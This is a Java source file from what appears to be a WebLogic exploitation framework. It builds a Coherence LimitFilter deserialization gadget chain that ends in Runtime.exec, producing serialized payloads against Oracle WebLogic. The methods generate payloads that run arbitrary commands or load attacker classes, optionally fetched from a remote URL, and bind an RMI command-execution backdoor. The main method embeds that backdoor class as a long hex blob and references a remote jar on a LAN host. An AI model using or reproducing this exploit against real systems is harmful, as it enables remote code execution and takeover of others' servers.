/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.r4v3zn.weblogic.framework.gadget.impl;

import cn.hutool.core.io.FileUtil;
import com.r4v3zn.weblogic.framework.annotation.Authors;
import com.r4v3zn.weblogic.framework.annotation.Dependencies;
import com.r4v3zn.weblogic.framework.utils.SocketUtils;
import com.r4v3zn.weblogic.framework.entity.GadgetParam;
import com.r4v3zn.weblogic.framework.gadget.ObjectGadget;
import org.mozilla.classfile.DefiningClassLoader;
import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Arrays;

import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: LimitFilterGadget
 * Desc: LimitFilter Gadget
 * Gadget chain:
 *        ObjectInputStream.readObject()
 *            BadAttributeValueExpException.readObject()
 *                LimitFilter.toString()
 *                    ChainedExtractor.extract()
 *                            ReflectionExtractor.extract()
 *                                Method.invoke()
 *                                    Class.getMethod()
 *                            ReflectionExtractor.extract()
 *                                Method.invoke()
 *                                    Runtime.getRuntime()
 *                            ReflectionExtractor.extract()
 *                                Method.invoke()
 *                                    Runtime.exec()
 * Date:2020/3/29 1:31
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
@Dependencies({":weblogic:coherence", ":mozilla:javascript"})
public class LimitFilterGadget implements ObjectGadget<Serializable> {
    /**
     * 获取序列化 payload (Runtime)
     * @param command 执行的命令
     * @return 序列结果
     * @throws Exception
     */
    @Override
    public Serializable getObject(String command, URLClassLoader urlClassLoader) throws Exception {
        final String[] execArgs = new String[] { command };
        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
        Object getMethod = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("getMethod",
                new Object[]{"getRuntime", new Class[0]});
        Object invoke = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("invoke",
                new Object[]{null, new Class[0]});
        Object exec = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("exec",
                new Object[]{execArgs});
        Object valueExtractor = Array.newInstance(valueExtractorClazz,3);
        Array.set(valueExtractor, 0, getMethod);
        Array.set(valueExtractor, 1, invoke);
        Array.set(valueExtractor, 2, exec);
        return getObject(valueExtractor, Runtime.class, urlClassLoader);
    }

    /**
     * 获取序列化 payload
     * @param codeByte 需要序列化的字节码
     * @param bootArgs 执行中参数,0位传入执行class命令,1位传入DefiningClassLoader url
     * @param className 反射的 class name
     * @return 序列结果
     * @throws Exception
     */
    @Override
    public Serializable getObject(byte[] codeByte, String[] bootArgs, String className, URLClassLoader urlClassLoader) throws Exception {
        String classPath = bootArgs[1];
        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
        Class clazz = null;
        Object valueExtractor = Array.newInstance(valueExtractorClazz,4);
        if(isBlank(classPath)){
            Object javascriptNewInstance = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
                    new Object[]{className, codeByte});
            Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                    new Object[]{bootArgs[0]});
            Array.set(valueExtractor, 0, javascriptNewInstance);
            Array.set(valueExtractor, 1, defineClass);
            Array.set(valueExtractor, 2, defineClassNewInstance);
            Array.set(valueExtractor, 3, rmiBind);
            clazz = DefiningClassLoader.class;
        }else{
            URL url = new URL(classPath);
            URL[] urls = new URL[]{url};
            valueExtractor = Array.newInstance(valueExtractorClazz,7);
            Object getConstructor = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("getConstructor",
                    new Object[]{new Class[]{URL[].class}});
            Object newInstance = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("newInstance",
                    new Object[]{new Object[]{urls}});
            Object loadClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("loadClass",
                    new Object[]{"org.mozilla.classfile.DefiningClassLoader"});
            Object javassistNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
                    new Object[]{className, codeByte});
            Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                    new Object[]{bootArgs[0]});
            Array.set(valueExtractor, 0, getConstructor);
            Array.set(valueExtractor, 1, newInstance);
            Array.set(valueExtractor, 2, loadClass);
            Array.set(valueExtractor, 3, javassistNewInstance);
            Array.set(valueExtractor, 4, defineClass);
            Array.set(valueExtractor, 5, defineClassNewInstance);
            Array.set(valueExtractor, 6, rmiBind);
            clazz = URLClassLoader.class;
        }
        return getObject(valueExtractor, clazz, urlClassLoader);
    }

    @Override
    public Serializable getObject(GadgetParam param) throws Exception {
        String className = param.getClassName();
        URLClassLoader urlClassLoader = param.getUrlClassLoader();
        byte[] bytes = param.getCodeByte();
        String[] bootArgs = param.getBootArgs();
        String classPath = bootArgs[1];
        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
        Class clazz = null;
        Object valueExtractor = Array.newInstance(valueExtractorClazz,4);
        if(isBlank(classPath)){
            Object javascriptNewInstance = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
                    new Object[]{className, bytes});
            Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                    new Object[]{bootArgs[0]});
            Array.set(valueExtractor, 0, javascriptNewInstance);
            Array.set(valueExtractor, 1, defineClass);
            Array.set(valueExtractor, 2, defineClassNewInstance);
            Array.set(valueExtractor, 3, rmiBind);
            clazz = DefiningClassLoader.class;
        }else{
            URL url = new URL(classPath);
            URL[] urls = new URL[]{url};
            valueExtractor = Array.newInstance(valueExtractorClazz,7);
            Object getConstructor = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("getConstructor",
                    new Object[]{new Class[]{URL[].class}});
            Object newInstance = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("newInstance",
                    new Object[]{new Object[]{urls}});
            Object loadClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("loadClass",
                    new Object[]{"org.mozilla.classfile.DefiningClassLoader"});
            Object javassistNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
                    new Object[]{className, bytes});
            Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                    new Object[]{bootArgs[0]});
            Array.set(valueExtractor, 0, getConstructor);
            Array.set(valueExtractor, 1, newInstance);
            Array.set(valueExtractor, 2, loadClass);
            Array.set(valueExtractor, 3, javassistNewInstance);
            Array.set(valueExtractor, 4, defineClass);
            Array.set(valueExtractor, 5, defineClassNewInstance);
            Array.set(valueExtractor, 6, rmiBind);
            clazz = URLClassLoader.class;
        }
        return getObject(valueExtractor, clazz, urlClassLoader);
    }

    /**
     * 文件写入
     *
     * @throws Exception
     * @param param
     */
    @Override
    public Serializable getWriteFileObject(GadgetParam param) throws Exception {
        return null;
    }

    /**
     * 加载文件
     *
     * @throws Exception
     * @param param
     */
    @Override
    public Serializable getLoadFileObject(GadgetParam param) throws Exception {
        return null;
    }

    /**
     * 获取序列化 payload
     * @param valueExtractors ValueExtractors
     * @param clazz 反序列化的 class
     * @return 序列结果
     * @throws Exception
     */
    private Serializable getObject(final Object valueExtractors, Class clazz, URLClassLoader urlClassLoader) throws Exception {
        Class limitFilterClazz = urlClassLoader.loadClass("com.tangosol.util.filter.LimitFilter");
        Class chainedExtractorClazz  = urlClassLoader.loadClass("com.tangosol.util.extractor.ChainedExtractor");
        Object limitFilter = limitFilterClazz.newInstance();
        Field m_comparator = limitFilterClazz.getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        Object chainedExtractor = chainedExtractorClazz.getConstructor(valueExtractors.getClass()).newInstance(valueExtractors);
        m_comparator.set(limitFilter, chainedExtractor);
        Field m_oAnchorTop = limitFilterClazz.getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, clazz);
        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);
        Field val = expException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(expException, limitFilter);
        return expException;
    }

    public static void main(String[] args) throws Exception {
        byte[] bytes = FileUtil.readBytes(new File("E:\\projects\\Idea-workspace\\vuldebug\\cve-2020-2551\\target\\classes\\RmiPocServer.class"));
        System.out.println(Arrays.toString(bytes));
        String hex = "cafebabe0000003200db0a0039007a07007b0a0002007a07007c0a0004007a0b007d007e07007f0a000700800a000200810800820a001d00830a001d00840a001d00850a000200860800870a001d008808008907008a0a0012007a08008b0a008c008d08008e0a001d008f0800900800910a001200920800930a0012009407009508005a0800960800970800980800990a009a009b0a009a009c0a009d009e08009f0700a00700a10a009d00a20800a30a002800a40a002700a50a009d00a60800a70a002700a80a001200a90a000200aa0a009d00ab0700ac0700ad0700ae0800af0800b00b00b100b20700b30700b40100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301000e4c526d69506f635365727665723b010007726d6942696e64010015284c6a6176612f6c616e672f537472696e673b2956010009726d69536572766572010007636f6e746578740100164c6a617661782f6e616d696e672f436f6e746578743b010001650100154c6a6176612f6c616e672f457863657074696f6e3b01000a636c69656e744e616d650100124c6a6176612f6c616e672f537472696e673b01000d537461636b4d61705461626c6507007f0100046d61696e010016285b4c6a6176612f6c616e672f537472696e673b2956010004617267730100135b4c6a6176612f6c616e672f537472696e673b010009706f635365727665720100117365745365727665724c6f636174696f6e010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b295601000173010002733101000a457863657074696f6e730700b50100116765745365727665724c6f636174696f6e010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b010003636d6401000873706c69744172720100026f7301000765786563436d64010038284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0100046c696e650100154c6a6176612f696f2f494f457863657074696f6e3b010008636c69656e744f73010006726573756c740100194c6a6176612f6c616e672f537472696e674275696c6465723b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000662756672496e0100184c6a6176612f696f2f42756666657265645265616465723b010009627566724572726f7201000a65786563757465436d6407007b07009507008a0700b60700a00700500700ac0700ad0700ae0700b701000b636c6f736553747265616d010016284c6a6176612f696f2f436c6f736561626c653b295601000673747265616d0100134c6a6176612f696f2f436c6f736561626c653b01000a536f7572636546696c65010011526d69506f635365727665722e6a6176610c003b003c01000c526d69506f6353657276657201001b6a617661782f6e616d696e672f496e697469616c436f6e746578740700b80c00b900ba0100136a6176612f6c616e672f457863657074696f6e0c00bb003c0c0042004301000240400c00bc00bd0c00be00bf0c00c000bf0c005d005e0100000c00c100c2010010636f6d6d6f6e64206e6f74206e756c6c0100176a6176612f6c616e672f537472696e674275696c6465720100076f732e6e616d650700c30c00c4005901000377696e0c00c500c601000470696e670100022d6e0c00c700c8010005202d6e20340c00c900bf0100106a6176612f6c616e672f537472696e670100022f63010005202d7420340100092f62696e2f626173680100022d630700ca0c00cb00cc0c00cd00ce0700b60c00cf00d001000777696e646f77730100166a6176612f696f2f42756666657265645265616465720100196a6176612f696f2f496e70757453747265616d5265616465720c00d100d201000347424b0c003b00d30c003b00d40c00d500d20100055554462d380c00d600bf0c00c700d70c007400750c00d8003c01001e6a6176612f6c616e672f496e746572727570746564457863657074696f6e0100246a6176612f696f2f556e737570706f72746564456e636f64696e67457863657074696f6e0100136a6176612f696f2f494f457863657074696f6e0100252065786563757465206572726f722c6d73673a206e6f7420666f756e6420636f6d6d6f6e6401000c2065786563757465206f6b210700d90c00da003c0100106a6176612f6c616e672f4f626a65637401002e7765626c6f6769632f636c75737465722f73696e676c65746f6e2f436c75737465724d617374657252656d6f74650100186a6176612f726d692f52656d6f7465457863657074696f6e0100116a6176612f6c616e672f50726f636573730100136a6176612f6c616e672f5468726f7761626c650100146a617661782f6e616d696e672f436f6e74657874010006726562696e64010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b295601000f7072696e74537461636b547261636501000573706c6974010027284c6a6176612f6c616e672f537472696e673b295b4c6a6176612f6c616e672f537472696e673b0100047472696d01001428294c6a6176612f6c616e672f537472696e673b01000b746f4c6f77657243617365010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b010008746f537472696e670100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010028285b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b01000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b01002a284c6a6176612f696f2f496e70757453747265616d3b4c6a6176612f6c616e672f537472696e673b2956010013284c6a6176612f696f2f5265616465723b295601000e6765744572726f7253747265616d010008726561644c696e6501001c2843294c6a6176612f6c616e672f537472696e674275696c6465723b01000764657374726f790100116a6176612f696f2f436c6f736561626c65010005636c6f73650021000200390001003a000000070001003b003c0001003d0000002f00010001000000052ab70001b100000002003e00000006000100000012003f0000000c0001000000050040004100000001004200430001003d000000a00003000400000021bb000259b700034dbb000459b700054e2d2b2cb900060300a700084d2cb60008b1000100000018001b00070003003e0000001e00070000001b0008001c0010001d00180020001b001e001c001f00200021003f0000003400050008001000440041000200100008004500460003001c000400470048000200000021004000410000000000210049004a0001004b0000000700025b07004c040009004d004e0001003d0000005c0002000300000012bb000259b700034c2a03324d2b2cb60009b100000002003e0000001200040000002400080025000c002600110027003f00000020000300000012004f005000000008000a005100410001000c00060049004a00020001005200530002003d0000003f0000000300000001b100000002003e0000000600010000002c003f00000020000300000001004000410000000000010054004a0001000000010055004a0002005600000004000100570001005800590002003d00000076000300040000001e2b120ab6000b4d2c03324c2c04324e2db6000cb6000d4e2a2b2db6000eb000000002003e0000001600050000003000070031000b0032000f003300170034003f0000002a00040000001e0040004100000000001e005a004a000100070017005b00500002000f000f005c004a0003005600000004000100570001005d005e0002003d000004530006000c0000021d2bc6000c120f2bb600109900061211b02bb6000c4cbb001259b700134e013a04013a05013a061214b800153a071907b6000d3a07013a0819071216b600179900402b1218b600179900202b1219b600179a0017bb001259b700132bb6001a121bb6001ab6001c4c06bd001d5903121e535904121f5359052b533a08a7003d2b1218b600179900202b1219b600179a0017bb001259b700132bb6001a1220b6001ab6001c4c06bd001d5903122153590412225359052b533a08b800231908b600243a041904b60025572c1226b60017990034bb002759bb0028591904b60029122ab7002bb7002c3a05bb002759bb0028591904b6002d122ab7002bb7002c3a06a70031bb002759bb0028591904b60029122eb7002bb7002c3a05bb002759bb0028591904b6002d122eb7002bb7002c3a06013a091905b6002f593a09c600122d1909b6001a100ab6003057a7ffe91906b6002f593a09c600122d1909b6001a100ab6003057a7ffe91905b800311906b800311904c600841904b60032a7007c3a091905b800311906b800311904c6006b1904b60032a700633a091905b800311906b800311904c600521904b60032a7004a3a09bb001259b700132bb6001a1236b6001ab6001c3a0a1905b800311906b800311904c600081904b60032190ab03a0b1905b800311906b800311904c600081904b60032190bbf2dc6000c120f2db60010990017bb001259b700132bb6001a1237b6001ab6001cb02db6001cb0000800b80167017e003300b801670197003400b8016701b0003500b8016701de0000017e018001de00000197019901de000001b001c701de000001de01e001de00000003003e000000ea003a0000003f000d00400010004200150043001d0044002000450023004600260047002d0048003400490037004a0041004b0053004c0067004e007e00500090005100a4005300b8005600c2005700c8005800d1005900e8005a0102005c0119005d0130005f01330060013e0061014d0063015800640167006b016c006c0171006d0176006e017e00660180006b0185006c018a006d018f006e019700670199006b019e006c01a3006d01a8006e01b0006801b2006901c7006b01cc006c01d1006d01d6006e01db006901de006b01e5006c01ea006d01ef006e01f4007001f700710204007202180074003f00000070000b01330034005f004a000901b2002c0047006000090000021d0040004100000000021d005a004a00010000021d0061004a0002001d0200006200630003002001fd006400650004002301fa006600670005002601f7006800670006002d01f0005c004a0007003701e6006900500008004b0000007e00140d02ff0056000907006a07006b07006b07006c07006d07006e07006e07006b07006f0000162513fb00492dfc000207006b19fa0019560700705807007158070072fd002a07007207006bff0002000907006a07006b07006b07006c07006d07006e07006e07006b07006f0001070073fe00150000070073f800020c1300560000000400010057000a007400750001003d0000005e000100020000000f2ac6000d2ab900380100a700044cb100010004000a000d00070003003e000000160005000000790004007b000a007d000d007c000e007f003f0000000c00010000000f007600770000004b0000000700024d07004c0000010078000000020079";
        System.out.println(SocketUtils.binaryToHexString(bytes));
        System.out.println(Arrays.toString(SocketUtils.hexStrToBinaryStr(hex)));
        String path = LimitFilterGadget.class.getResource("/lib/").getPath();
        String fullClientPath = path + "12.2.1.3.0/"+"coherence.jar";
        URL[] urls = new URL[]{new URL("file:"+fullClientPath)};
        URLClassLoader urlClassLoader = new URLClassLoader(urls,Thread.currentThread().getContextClassLoader());
        LimitFilterGadget limitFilterGadget = new LimitFilterGadget();
        // bytes,new String[]{bindName, javascriptJarUrl}, RMI_POC
//        limitFilterGadget.getObject("calc", urlClassLoader);
        String bindName = "ahahha";
        String javascriptJarUrl = "http://192.168.1.6:8080/com.bea.javascript.jar";
//        limitFilterGadget.getObject(bytes,new String[]{bindName, javascriptJarUrl}, "RmiPocServer",urlClassLoader);
    }
}
